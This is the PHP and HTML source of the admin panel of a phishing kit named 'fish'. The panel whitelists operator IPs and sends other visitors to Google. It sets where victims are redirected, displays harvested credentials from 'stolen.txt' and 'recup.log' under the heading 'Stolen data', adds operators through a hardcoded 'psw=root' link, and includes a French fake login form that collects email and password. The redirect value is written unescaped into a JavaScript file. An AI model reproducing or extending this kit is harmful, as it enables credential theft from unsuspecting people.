<?php
	function login() {
		$ip = $_SERVER['REMOTE_ADDR'] . "\n";
		$file = "../data/users.txt";
		$fip = fopen($file, 'r') or die("can't open file");
	
		if($fip) {
			while(!feof($fip)) {
				$line = fgets($fip);
				if($line == $ip) {
					goto ip_valid;
				}
			}
			header('Location: http://www.google.com');
			ip_valid:
			fclose($fip);
		}
	}

	if($_SERVER['REQUEST_METHOD'] === 'POST') {
		if(strlen($_POST['red_url']) != 0){
			$file = fopen("../fish_logic/redirect.js", 'w') or die("can't open file");
			$str = "document.location.href='" . $_POST['red_url'] . "';";
			fwrite($file, $str);
			fclose($file);
		}
	} else {
		login();
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<title>Admin - fish</title>
		<link rel="icon" href="https://avatars1.githubusercontent.com/u/19672114?v=3&s=460">
		<meta http-equiv="refresh" content="30">
	</head>
	<body>
		<h1>Admin page for fish</h1>

		<div class="div_class" id="redirect_div_id">
			<h2 class="h2_class" id="redirect_header_id">redirect to page:</h2>
			<form action="" method="POST" id="redirect_form_id">
				<input type="text" name="red_url" placeholder="url here" id="redirect_placeholder_id" class="input_redirect_class"/>
				<input type="submit" name="submit" value="save" id="redirect_button_id" class="input_redirect_class"/>
			</form>
		</div>
		<div class="div_class" id="allowed_users_div_id">
			<h2 class="h2_class" id="allowed_users_header_id">allowed users:</h2>
			<ul class="allowed_users_list_class" id="allowed_users_list_id">
		<?php $file = "../data/users.txt";
					$fip = fopen($file, 'r') or die("can't open file");
					$i = 0;
			    if($fip) {
      			while(!feof($fip)) {
      	  		$line = fgets($fip);
							if(strlen($line) > 1){
								$i += 1;
								echo '<li class="allowed_user_list_ellement_class"'. 'id="allowed_user_list_ellement_no'. $i .'">' . $line . '</li>';
							}
			      }
						fclose($fip);
    			} else {
						echo '<li class="allowed_user_list_ellement_class" id="allowed_user_list_error">Error reading the file!</li>';
					} ?>
			</ul>
		</div>
		<div class="div_class" id="add_new_user_div">
			<h2 class="h2_class" id="add_new_user_header_id">add new user:</h2>
			<input class="button_class" id="button_add_user" type="submit" value="click to add a user" onclick="var user = prompt('user ip:'); if(user != null) { document.location.href='../fish_logic/add_new_user.php?psw=root&user='+user } ">
		</div>
		<div class="div_class" id="stolen_txt_div">
			<h2 class="h2_class" id="stolen_data_header">Stolen data:</h2>
			<embed class="iframe_class" id="stolen_txt_iframe" src="../data/stolen.txt" />
			<a href="../data/stolen.txt"><h3 class="h3_class" id="reload_header1">Reload page</h3></a>
			<embed class="iframe_class" id="recup_log_iframe" src="../data/recup.log" />
			<a href="../data/recup.log"><h3 class="h3_class" id="reload_header2">Reload page</h3></a>
		</div>
		<div class="div_class" id="code_div">
			<h2 class="h2_class" id="source_code_header">Source code:</h2>
			<code class="code_class" id="sample_html_code">
				&ltform action="login.php" method="POST"><br />
&nbsp				&ltlabel>Nom d'utilisateur:&lt/label>&ltbr /><br />
&nbsp				&ltinput type="username" name="Email" id="Email">&ltbr /><br />
&nbsp				&ltlabel>Mots de passe:&lt/label>&ltbr /><br />
&nbsp				&ltinput type="password" name="Passwd" id="Passwd"><br />
<br />
&nbsp				&ltinput type="submit" name="signIn" id="signIn" value="Mise a jour"><br />
			&lt/form><br />
				</code>
		</div>
	</body>
</html>
